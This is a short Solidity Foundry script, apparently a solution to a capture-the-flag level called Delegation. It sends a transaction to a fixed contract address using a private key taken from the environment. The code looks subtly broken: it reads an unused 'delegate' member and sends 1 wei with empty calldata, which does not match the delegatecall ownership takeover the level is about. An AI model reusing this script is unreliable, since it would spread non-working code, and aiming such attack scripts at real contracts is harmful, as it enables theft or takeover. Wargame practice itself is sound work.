// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Delegation,Delegate} from "../src/level6Delegation.sol";

contract Level6Solution is Script {
    Delegation delegation =
        Delegation(0x09e5b7b3bb56082E8A5CB7b7F67cE82E195C753a);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Delegate cont = delegation.delegate;
        (bool success, ) = address(delegation).call{value: 1 wei}("");
        require(success, "not success");
        console.log("success");
        vm.stopBroadcast();
    }
}
